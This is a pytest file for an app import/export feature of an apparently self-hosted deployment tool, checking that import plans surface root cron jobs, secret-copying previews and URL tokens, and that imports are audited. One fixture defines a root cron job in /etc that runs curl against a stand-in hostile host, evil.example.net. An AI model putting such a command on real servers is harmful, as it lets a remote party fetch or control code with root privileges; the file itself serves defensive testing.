# Copyright (c) 2024-2026 Yago Lopez Prado
# SPDX-License-Identifier: AGPL-3.0-or-later

"""
What an imported document may do, and what the operator sees before it does.

A document is input from somewhere else: it can name cron jobs that run as
root in any directory, previews that copy every variable to pull requests,
and a source whose URL carries a token in its query. Pinned here: the plan
spells each of those out, asks for a yes, audits every cron job an import
creates, keeps a token in a query out of an export, gives the first
deployment the document's health check, and reads a document with sections
left out. Names derived from the exported domain are renamed as whole words
only.
"""

# ruff: noqa: F811

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any

import pytest

from noust.core.exceptions import ValidationError
from noust.core.store import App, NoustStore
from noust.deployers import app_export
from noust.deployers.app_export import (
    CreateSpec,
    apply_import,
    export_app,
    load_document,
    plan_import,
    plan_summary,
    strip_url_secrets,
    validate_document,
)
from tests.test_app_export import (  # noqa: F401  (pytest resolves fixtures by name)
    DOMAIN,
    NEW,
    STRIPE,
    TOKEN,
    FakeCron,
    cron,
    engine,
    fake_deploy,
    minimal,
    no_sweep_timer,
    shop,
    store,
)

SOURCE = "https://github.com/acme/shop.git"


def document(**sections: Any) -> dict[str, Any]:
    """A minimal valid document with the sections given."""
    doc = minimal(source=SOURCE)
    doc.update(sections)
    return doc


ROOT_JOB = {
    "name": "shop-example-com-sync",
    "schedule": "hourly",
    "command": "/usr/bin/curl -fsS https://evil.example.net/x",
    "user": "root",
    "working_directory": "/etc",
}


# The plan says what each part does ---------------------------------------------


def test_the_plan_shows_every_cron_job_with_its_user_directory_and_command(
    store: NoustStore,
) -> None:
    plan = plan_import(document(cron=[ROOT_JOB]))

    [line] = [step for step in plan.steps if step.startswith("cron ")]
    assert line == (
        "cron shop-example-com-sync [hourly] as root (root: the whole server) in /etc "
        "(outside the application): /usr/bin/curl -fsS https://evil.example.net/x"
    )
    assert plan.confirm == [
        "creates 1 cron job(s) that run commands the document chose, 1 of them as root"
    ]
    assert plan_summary(plan)["confirm"] == plan.confirm


def test_a_job_in_the_applications_own_directory_is_not_called_out(store: NoustStore) -> None:
    job = {"name": "tidy", "schedule": "daily", "command": "npm run tidy"}
    job["working_directory"] = f"/var/www/apps/{DOMAIN.replace('.', '-')}/current"
    plan = plan_import(document(cron=[job]))

    [line] = [step for step in plan.steps if step.startswith("cron ")]
    assert line == (f"cron tidy [daily] as www-data in {job['working_directory']}: npm run tidy")


def test_the_plan_shows_what_previews_copy_and_whether_bots_deploy(store: NoustStore) -> None:
    everything = plan_import(
        document(previews={"base_domain": "pr.example.com", "allow_bots": True})
    )
    assert (
        "previews under pr.example.com: bots' pull requests deploy too, every variable "
        "copied, secrets included"
    ) in everything.steps
    assert any("secrets included" in reason for reason in everything.confirm)
    assert any("bots" in reason for reason in everything.confirm)

    careful = plan_import(
        document(
            previews={
                "base_domain": "pr.example.com",
                "max_previews": 3,
                "ttl_hours": 24,
                "exclude_env": ["STRIPE_KEY"],
            }
        )
    )
    assert (
        "previews under pr.example.com: at most 3, removed after 24 h, no bots, every "
        "variable copied except STRIPE_KEY"
    ) in careful.steps


def test_the_plan_shows_zero_downtime_and_backup_destinations(shop: App, cron: FakeCron) -> None:
    doc = export_app(DOMAIN, with_secrets=True, cron=cron)  # type: ignore[arg-type]
    plan = plan_import(doc, domain=NEW, source=SOURCE)

    assert "backup schedule daily, to offsite, gone" in plan.steps
    assert (
        "zero-downtime: every activation starts a second instance and switches to it, "
        "draining the old one for 20 s"
    ) in plan.steps


def test_a_plain_document_needs_no_confirmation(store: NoustStore) -> None:
    assert plan_import(document()).confirm == []


# Every cron job an import creates is audited ------------------------------------


def test_each_cron_job_an_import_creates_is_audited(
    store: NoustStore,
    cron: FakeCron,
    engine: list[str],
    tmp_path: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    plan = plan_import(document(cron=[ROOT_JOB]), domain=NEW)
    with caplog.at_level(logging.INFO, logger="noust.audit"):
        report = apply_import(
            plan,
            deploy=fake_deploy(store, tmp_path, engine),
            cron=cron,  # type: ignore[arg-type]
            actor="token:ops",
        )

    assert not report.not_applied
    [record] = [r for r in caplog.records if r.name == "noust.audit"]
    assert record.getMessage() == (
        "create_cron_job name=store-example-org-sync schedule=hourly session=token:ops "
        f"user=root via=import app={NEW}"
    )


# A token in an archive URL does not survive an export ----------------------------


@pytest.mark.parametrize(
    ("source", "exported"),
    [
        (
            "https://dl.example.com/app.tar.gz?token=" + "ab" + "cd",
            "https://dl.example.com/app.tar.gz?***",
        ),
        (
            "https://bucket.s3.amazonaws.com/a.zip?X-Amz-Signature=" + "ab" + "cd&X-Amz-Date=1",
            "https://bucket.s3.amazonaws.com/a.zip?***",
        ),
        ("https://github.com/acme/shop.git#" + TOKEN, "https://github.com/acme/shop.git#***"),
        ("https://dl.example.com/a.zip?t=1#frag", "https://dl.example.com/a.zip?***#***"),
        ("https://github.com/acme/shop.git", "https://github.com/acme/shop.git"),
        ("/srv/code?odd", "/srv/code?odd"),
    ],
)
def test_the_query_and_fragment_of_an_http_source_are_stripped(source: str, exported: str) -> None:
    assert strip_url_secrets(source) == exported


def test_an_export_without_secrets_strips_the_query_and_the_import_asks_again(
    store: NoustStore, tmp_path: Path, cron: FakeCron
) -> None:
    secret_url = "https://dl.example.com/app.tar.gz?token=" + "ab" + "cd1234"
    store.create_app(
        App(
            domain=DOMAIN,
            app_type="static",
            source=secret_url,
            port=3000,
            app_path=str(tmp_path / "apps" / "shop-example-com"),
        )
    )
    doc = export_app(DOMAIN, cron=cron)  # type: ignore[arg-type]
    assert doc["app"]["source"] == "https://dl.example.com/app.tar.gz?***"
    assert "ab" + "cd1234" not in json.dumps(doc)

    with pytest.raises(ValidationError, match="credentials taken out") as caught:
        plan_import(doc, domain=NEW)
    assert caught.value.field == "source"

    kept = export_app(DOMAIN, with_secrets=True, cron=cron)  # type: ignore[arg-type]
    assert kept["app"]["source"] == secret_url
    plan = plan_import(kept, domain=NEW)
    assert "ab" + "cd1234" not in json.dumps(plan_summary(plan)), "never shown in a plan"


# The first deployment asks the document's health check ---------------------------


def test_the_create_spec_carries_the_documents_health_check(store: NoustStore) -> None:
    plan = plan_import(minimal(source=SOURCE, health={"path": "/up", "timeout": 30}))
    assert plan.create.initial_health == ("/up", None, 30)
    assert plan_summary(plan)["create"]["health_path"] == "/up"
    assert plan_import(document()).create.initial_health is None


def test_a_health_check_the_gate_cannot_use_stops_the_plan(store: NoustStore) -> None:
    doc = minimal(source=SOURCE, health={"path": "//evil.host"})
    with pytest.raises(ValidationError) as caught:
        plan_import(doc)
    assert caught.value.field == "app.health.path"


def test_a_health_check_the_deployment_recorded_is_not_set_again(
    store: NoustStore, cron: FakeCron, engine: list[str], tmp_path: Path
) -> None:
    doc = minimal(source=SOURCE, health={"path": "/up"})
    plan = plan_import(doc, domain=NEW)
    deploy = fake_deploy(store, tmp_path, engine)
    seen: list[CreateSpec] = []

    def deploy_with_health(spec: CreateSpec) -> None:
        seen.append(spec)
        deploy(spec)
        path, expect, timeout = spec.initial_health or (None, None, None)
        store.set_app_health(spec.domain, path=path, expect=expect, timeout=timeout)

    report = apply_import(plan, deploy=deploy_with_health, cron=cron)  # type: ignore[arg-type]

    assert seen[0].health_path == "/up"
    assert "health" not in engine, "set_health_check was not called a second time"
    assert [step.part for step in report.steps if step.applied] == [f"deploy {NEW}", "health check"]


# A document with sections left out -------------------------------------------------


def test_a_document_without_optional_sections_is_filled_in(store: NoustStore) -> None:
    bare = {"format": "wasm-app", "version": 1, "app": {"domain": DOMAIN, "app_type": "static"}}
    doc = validate_document(bare)

    assert doc["domains"] == {"aliases": [], "redirects": []}
    assert doc["cron"] == [] and doc["env"] == {} and doc["databases"] == []
    assert doc["backup"] is None and doc["previews"] is None
    assert doc["app"]["health"] == {} and doc["app"]["zero_downtime"] == {}
    assert "domains" not in bare and "health" not in bare["app"], "the input is not changed"
    plan = plan_import({**bare, "app": {**bare["app"], "source": SOURCE}})
    assert plan.steps == [f"deploy {DOMAIN} (static) from {SOURCE}"]


def test_a_document_nested_past_the_parsers_limit_is_refused() -> None:
    with pytest.raises(ValidationError, match="nests too deeply"):
        load_document("[" * 100_000 + "]" * 100_000)


# Names derived from the domain ---------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "renamed"),
    [
        ("shop-example-com-nightly", "store-example-org-nightly"),
        ("shop-example-com", "store-example-org"),
        ("backup-shop-example-com", "backup-store-example-org"),
        ("myshop-example-com-sync", "myshop-example-com-sync"),
        ("shop-example-community", "shop-example-community"),
        ("api.shop.example.com", "api.store.example.org"),
        ("shop.example.com", "store.example.org"),
    ],
)
def test_only_whole_derived_names_are_renamed(name: str, renamed: str) -> None:
    assert app_export._rename(name, DOMAIN, NEW) == renamed


def test_stripe_is_never_in_a_plan_summary(shop: App, cron: FakeCron) -> None:
    doc = export_app(DOMAIN, with_secrets=True, cron=cron)  # type: ignore[arg-type]
    plan = plan_import(doc, domain=NEW, source=SOURCE)
    assert STRIPE not in json.dumps(plan_summary(plan))
